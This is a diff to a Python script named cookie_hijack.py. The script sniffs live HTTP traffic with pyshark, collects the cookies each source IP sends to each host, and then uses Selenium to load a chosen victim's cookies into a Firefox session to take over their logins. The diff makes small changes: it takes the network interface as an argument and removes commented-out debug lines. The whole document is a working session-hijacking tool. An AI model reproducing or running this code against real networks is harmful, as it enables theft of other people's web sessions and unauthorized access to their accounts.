@@ -62,16 +62,15 @@ def sniff():
 		if not stop:
 			try:
 				if packet.http.request_method == 'GET':
-					#print(packet.ip.src, packet.http.host, packet.http.cookie)
 					data.insert(packet.ip.src, packet.http.host, packet.http.cookie)
 			except AttributeError:
 				pass
 		else:
 			break
 
-if len(sys.argv) > 0:
-	#time = int(sys.argv[1])
-	capture = pyshark.LiveCapture(interface='enp0s3', display_filter="http", bpf_filter="tcp port 80")
+if len(sys.argv) > 1:
+	interface = sys.argv[1]
+	capture = pyshark.LiveCapture(interface=interface, display_filter="http", bpf_filter="tcp port 80")
 
 	t = threading.Thread(target=sniff)
 	t.start()
@@ -82,9 +81,8 @@ if len(sys.argv) > 0:
 	except EOFError:
 		stop = True
 
-	#print(data)
+	print(data)
 	driver = webdriver.Firefox()
-	#driver.set_preference("browser.privatebrowsing.autostart", True)
 
 	data.gen_src_trans()
 	print("Sources:")
@@ -104,7 +102,6 @@ if len(sys.argv) > 0:
 					driver.get("http://" + data.nr_to_host[b])
 					driver.delete_all_cookies()
 					for cookie in data.data[data.nr_to_src[a]][data.nr_to_host[b]]:
-						#print(cookie)
 						driver.add_cookie(cookie)
 					driver.get("http://" + data.nr_to_host[b])
 					print("Cookies injected")
@@ -119,4 +116,4 @@ if len(sys.argv) > 0:
 			else:
 				print("Wrong source number")
 else:
-	print("Usage: python3 cookie_hijack.py <timeout>")
+	print("Usage: python3 cookie_hijack.py <interface>")
